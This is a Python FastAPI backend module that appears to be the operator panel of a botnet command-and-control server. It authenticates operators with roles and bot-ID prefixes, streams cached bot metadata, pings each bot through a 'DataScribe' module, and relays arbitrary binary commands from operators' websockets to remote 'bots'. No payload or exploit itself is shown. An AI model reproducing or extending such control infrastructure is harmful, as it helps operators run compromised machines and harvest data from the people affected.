import uvicorn, asyncio, json
from pathlib import Path
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

from .Database import verify_user, register_user, load_db, load_bots_from_file, get_login_by_token, generate_token
from .ZmqDispatcher import zmq_pull_task_loop
from backend import ZMQ_WORKER_PUSH_API
from backend.Services import send_binary_to_bot
from logs import Log as logger


class ConnectionManager:
    def __init__(self):
        self.active = {}

    async def connect(self, ws, login, user):
        await ws.accept()
        self.active.setdefault(login, {"sockets": [], "role": user["role"], "prefix": user["prefix"]})[
            "sockets"].append(ws)
        logger.info(f"[API] [+] {login} ({len(self.active[login]['sockets'])} active)")

    def disconnect(self, ws, login):
        if login in self.active:
            self.active[login]["sockets"].remove(ws)
            if not self.active[login]["sockets"]: self.active.pop(login)
        logger.info(f"[API] [-] {login}")


manager = ConnectionManager()


def pack_bot(bot_id, payload):
    payload["id"] = payload.get("id", bot_id)
    b_id, b_mod, b_pay = bot_id.encode(), b"DataScribe", json.dumps(payload).encode()
    return len(b_id).to_bytes(1, 'big') + b_id + len(b_mod).to_bytes(1, 'big') + b_mod + len(b_pay).to_bytes(4,
                                                                                                             'big') + b_pay
def pack_bot_command(bot_id, mod, payload):
    b_id, b_mod, b_pay = bot_id.encode(), mod.encode(), payload.encode()
    return len(b_id).to_bytes(1, 'big') + b_id + len(b_mod).to_bytes(1, 'big') + b_mod + len(b_pay).to_bytes(4, 'big') + b_pay

def has_access(user, target_id):
    return user["role"] == "admin" or user["prefix"] == "ALL" or target_id.startswith(user["prefix"])


@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(zmq_pull_task_loop(manager.active, ZMQ_WORKER_PUSH_API))
    yield
    task.cancel()


app = FastAPI(lifespan=lifespan)
app.mount("/sidebar", StaticFiles(directory=Path(__file__).resolve().parent.parent.parent / "frontend", html=True),
          name="static")


@app.get("/")
async def root(): return RedirectResponse("/sidebar/auth/auth.html")


@app.get("/verify_token")
async def verify(token: str = Query(None)):
    login = get_login_by_token(token)
    return {"status": "ok", "login": login} if login else JSONResponse(status_code=401, content={"status": "error"})


@app.post("/{action}")
async def auth(action: str, data=Body(...)):
    login, pwd = data.get("login"), data.get("password")
    if action == "register":
        return {"status": "ok"} if register_user(login, pwd) else {"status": "error"}

    user = verify_user(login, pwd)
    if user:
        return {"status": "ok", "token": generate_token(login), "role": user["role"], "prefix": user["prefix"]}
    return {"status": "error", "message": "Invalid credentials"}


@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket, token: str = Query(None), login: str = Query(None),
                             mode: str = Query(None)):
    user_login = get_login_by_token(token)
    if not user_login or user_login != login:
        await ws.accept()
        await ws.close(1008)
        return

    user = load_db().get(user_login)
    await manager.connect(ws, user_login, user)

    try:
        if mode != "control":
            bots = load_bots_from_file()
            for bid, pay in bots.items():
                if has_access(user, bid) and isinstance(pay, dict):
                    # 1. Шлем кэш из БД для мгновенной отрисовки
                    await ws.send_bytes(pack_bot(bid, pay))

                    # 2. Пингуем бота для получения свежих метаданных
                    # Используем твой pack_bot, но с полезной нагрузкой "get_metadata"
                    # так как pack_bot ожидает dict, передаем строку напрямую через упаковку
                    ping_pkt = pack_bot_command(bid, "DataScribe", "get_metadata")
                    asyncio.create_task(send_binary_to_bot(bid, ping_pkt))

        while True:
            msg = await ws.receive()
            if "bytes" in msg:
                pkt = msg["bytes"]
                target_id = pkt[1:1 + pkt[0]].decode(errors='ignore')
                if has_access(user, target_id):
                    await send_binary_to_bot(target_id, pkt)
            elif "text" in msg and '"ui.disconnect"' in msg["text"]:
                break
    except Exception:
        pass
    finally:
        manager.disconnect(ws, user_login)


async def run_fastapi_server(host, port):
    await uvicorn.Server(uvicorn.Config(app, host=host, port=port, log_level="warning")).serve()